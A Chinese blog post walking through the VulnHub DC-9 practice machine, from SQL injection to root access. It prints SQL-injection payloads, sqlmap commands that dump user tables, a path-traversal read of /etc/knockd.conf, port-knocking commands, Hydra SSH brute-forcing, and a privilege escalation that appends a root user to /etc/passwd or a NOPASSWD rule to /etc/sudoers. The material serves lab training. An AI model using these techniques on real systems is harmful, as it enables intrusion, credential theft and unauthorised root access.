---
title: "VulnHub DC-9 渗透实录：从 SQL 注入到端口敲门提权"
summary: "DC 系列第九台靶机：POST 型 SQL 注入拿到后台凭据，文件包含读出 knockd 配置，端口敲门放行 SSH，再用一个文件追加脚本把 root 权限写进系统文件。"
category: tech
publishedAt: 2026-10-08
tags: ["VulnHub", "渗透测试", "SQL注入", "提权", "端口敲门"]
cover: "/images/post-vulnhub-dc9.webp"
coverAlt: "暗色终端中的 SQL 查询与端口扫描"
featured: false
kicker: "靶场复盘"
---

> **靶机 IP 说明：** 原文使用 `192.168.0.142`，这里统一替换为 `192.168.56.101`（VulnHub 常用 host-only 网段），实操时替换为你的靶机实际 IP。

DC 系列是一组专门为渗透测试设计的易受攻击实验环境，共九个靶场，每个都藏着 Flag，需要一步步提权到 root。本文记录 DC-9 的完整过程。

实验环境：攻击机 Kali Linux，靶机 DC-9，两台机器均设置为 NAT 模式。

## 一、信息收集

### 1.1 主机发现

先用 `arp-scan` 或 `netdiscover` 扫描存活主机：

```bash
arp-scan -l
# 或
netdiscover -r 192.168.56.0/24
```

发现存活主机 **192.168.56.101**。

### 1.2 端口扫描

```bash
nmap -sV -sC -p- 192.168.56.101
```

发现 **80 端口开放，22 端口被 filtered**。这里先记下一条线索：靶机可能用 `knockd` 把 22 端口关掉，需要按特定顺序访问端口序列后才会放行 SSH。

## 二、Web 渗透 —— SQL 注入

### 2.1 发现注入点

访问 `http://192.168.56.101`，点击导航栏的 **Search**，出现一个搜索框。先判断注入：

```sql
1' or 1=1#
```

搜索出大量结果，说明条件恒真。

```sql
1' or 1=2#
```

无结果返回，确认此处存在 **SQL 注入**。

### 2.2 BurpSuite 抓包

该注入点通过 POST 提交。用 BurpSuite 抓取 search 页面提交的数据，右键 → **Copy to file**，保存为 `dc9.txt`。

### 2.3 sqlmap 爆破数据库

```bash
# 列出数据库
sqlmap -r dc9.txt --dbs

# 列出 users 数据库中的表
sqlmap -r dc9.txt -D users --tables

# 列出表的字段
sqlmap -r dc9.txt -D users -T UserDetails --columns

# 导出数据
sqlmap -r dc9.txt -D users -T UserDetails --dump

# 列出 Staff 数据库中的数据
sqlmap -r dc9.txt -D Staff --tables
sqlmap -r dc9.txt -D Staff -T Users --dump
```

拿到后台登录账号密码后，用 admin 账号登录后台。

## 三、文件包含与 knockd 端口敲门

### 3.1 发现文件包含

登录后台后页面出现「文件不存在」的提示，怀疑存在文件包含漏洞。尝试读取文件，发现只能使用相对路径。

```bash
# 用 BurpSuite Intruder / ffuf 爆破可包含的文件
ffuf -u 'http://192.168.56.101/manage.php?file=FUZZ' -w /usr/share/wordlists/dirb/common.txt
```

### 3.2 读取 knockd 配置

结合前面 22 端口被 filtered 的线索，猜测使用了 `knockd`，通过文件包含读取它的配置：

```
?file=../../../../etc/knockd.conf
```

配置内容显示，需要**依次触发三个端口**才能开放 SSH：

```
[options]
    UseSyslog

[openSSH]
    sequence    = 7469,8475,9842
    seq_timeout = 25
    command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT && /sbin/iptables -I OUTPUT -d %IP% -p tcp --sport 22 -j ACCEPT

[closeSSH]
    sequence    = 9842,8475,7469
    seq_timeout = 25
    command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT && /sbin/iptables -D OUTPUT -d %IP% -p tcp --sport 22 -j ACCEPT
```

### 3.3 执行端口敲门

```bash
nc 192.168.56.101 7469
nc 192.168.56.101 8475
nc 192.168.56.101 9842
```

或用一行命令：

```bash
for port in 7469 8475 9842; do nc -w 1 192.168.56.101 $port; done
```

再次扫描，发现 **22 端口已开放**：

```bash
nmap -p 22 192.168.56.101
```

## 四、SSH 爆破

### 4.1 构造字典

从之前 sqlmap 导出的 `users` 数据库中提取用户名和密码，建立用户名字典 `users.txt` 与密码字典 `pass.txt`。

### 4.2 Hydra 爆破

```bash
hydra -L users.txt -P pass.txt 192.168.56.101 ssh
```

爆破出三个可登录账户，但登录后均无 sudo 权限。

### 4.3 发现隐藏密码

登录 `janitor` 账户，在其家目录中发现隐藏目录，内含一个密码文件，里面的密码此前没有出现在数据库中。把它追加到 `pass.txt` 后再次爆破：

```bash
hydra -L users.txt -P pass.txt 192.168.56.101 ssh
```

新发现可登录账户 **fredf**。

## 五、提权

### 5.1 分析 sudo 权限

```bash
ssh fredf@192.168.56.101
sudo -l
```

发现 fredf 可以 root 权限执行 `/opt/devstuff/test`。

### 5.2 分析 test 脚本

查看源码：

```bash
cat /opt/devstuff/test.py
```

该 Python 脚本的功能是：**把参数 1 指定的文件内容追加到参数 2 指定的文件中**。

```python
#!/usr/bin/python
import sys

if len(sys.argv) != 3:
    print("Usage: python test.py read_file write_file")
    sys.exit(1)

with open(sys.argv[1], 'r') as f:
    content = f.read()

with open(sys.argv[2], 'a') as f:
    f.write(content)
```

### 5.3 利用 test 提权

思路很直接：既然能往任意文件以 root 权限追加内容，那就把构造好的用户信息追加到 `/etc/passwd`，或往 `/etc/sudoers` 写一条规则。

**方案一：写入 /etc/passwd**

```bash
# 生成一个 root 权限用户的密码哈希
openssl passwd -1 -salt newroot password123

# 构造 passwd 条目
echo 'newroot:$1$newroot$hashvalue:0:0:root:/root:/bin/bash' > /tmp/newuser

# 追加到 /etc/passwd
sudo /opt/devstuff/test /tmp/newuser /etc/passwd

# 切换用户
su newroot
```

**方案二：写入 /etc/sudoers**

```bash
echo 'fredf ALL=(ALL) NOPASSWD: ALL' > /tmp/sudoers_append
sudo /opt/devstuff/test /tmp/sudoers_append /etc/sudoers
sudo -i
```

### 5.4 获取 Flag

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/flag.txt
```

提权成功！

## 六、攻击链总结

```
主机发现 → 端口扫描 → Web 目录枚举
    → SQL 注入（sqlmap dump 用户凭据）
    → 后台登录 → 文件包含 → 读取 knockd 配置
    → 端口敲门（nc）→ SSH 端口开放
    → Hydra 爆破 SSH → janitor 隐藏密码 → 二次爆破 → fredf 登录
    → sudo /opt/devstuff/test（文件追加）→ 写入 /etc/passwd 或 /etc/sudoers
    → root → cat /root/flag.txt
```

## 七、关键知识点

| 技术点 | 说明 |
|--------|------|
| SQL 注入 | POST 型注入，sqlmap 自动化利用 |
| Knockd 端口敲门 | 按序访问指定端口后才能开放 SSH |
| 文件包含（LFI） | 利用相对路径读取 `/etc/knockd.conf` |
| SSH 字典爆破 | Hydra 配合 sqlmap 导出的凭据字典 |
| 信息收集 | janitor 家目录下的隐藏密码文件 |
| 提权 | 利用 sudo 权限的文件追加功能写入系统文件 |

## 八、易错点

1. **knockd 端口敲门顺序不能错**，必须是 `7469 → 8475 → 9842`。
2. **文件包含只能用相对路径**，绝对路径被过滤，需要 `../` 回溯到根目录。
3. **janitor 的隐藏密码容易遗漏**，需要用 `ls -la` 查看隐藏目录。
4. 写入 `/etc/passwd` 时注意保持文件格式正确；写入 `/etc/sudoers` 更直接，但注意不要破坏现有配置。
5. 端口敲门有超时（`seq_timeout = 25`），需在 25 秒内完成三个端口的访问。

## 九、相关链接

- VulnHub DC-9: [https://www.vulnhub.com/entry/dc-9,412/](https://www.vulnhub.com/entry/dc-9,412/)
- Knockd 文档: [https://linux.die.net/man/1/knockd](https://linux.die.net/man/1/knockd)
